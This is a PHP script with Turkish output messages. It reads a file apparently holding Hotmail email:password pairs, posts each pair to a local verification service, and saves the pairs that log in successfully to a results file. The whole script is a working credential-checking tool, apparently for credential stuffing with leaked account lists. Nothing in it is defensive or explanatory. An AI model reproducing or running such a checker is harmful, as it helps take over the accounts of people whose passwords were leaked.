<?php



$inputFile = 'TXT/Hotmail.txt'; 
$outputFile = 'successful_verifications.txt'; 

$successfulCount = 0;
$successfulData = [];

if ($handle = fopen($inputFile, 'r')) {
    while (($line = fgets($handle)) !== false) {
        $line = trim($line);
        if (empty($line)) continue; 

        list($email, $password) = explode(':', $line);

        $data = array(
            'email' => $email,
            'password' => $password
        );

        $jsonData = json_encode($data);

        $url = 'http://localhost:3000/verify';

        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));

        $response = curl_exec($ch);

        $decodedResponse = json_decode($response, true);

        // print_r($decodedResponse);
        if ($decodedResponse['success']) {
            file_put_contents($outputFile, $line . PHP_EOL, FILE_APPEND);
             echo "---------------------------------------------\n";
             echo "GİRİŞ BAŞARILI => " . $data["email"] . "\n";
              echo "---------------------------------------------\n";
            $successfulCount++;
        }else{
           
            echo "Başarısız Giriş Denemesi => " . $data["email"] . "\n";
        }

        // cURL oturumunu kapat
        curl_close($ch);
    }

    // Dosya okuma işlemini sonlandır
    fclose($handle);
}

// Sonuçları döndür
$result = array(
    'saved_records' => $successfulCount,
    'output_file_path' => realpath($outputFile)
);

header('Content-Type: application/json');
echo json_encode($result);

?>
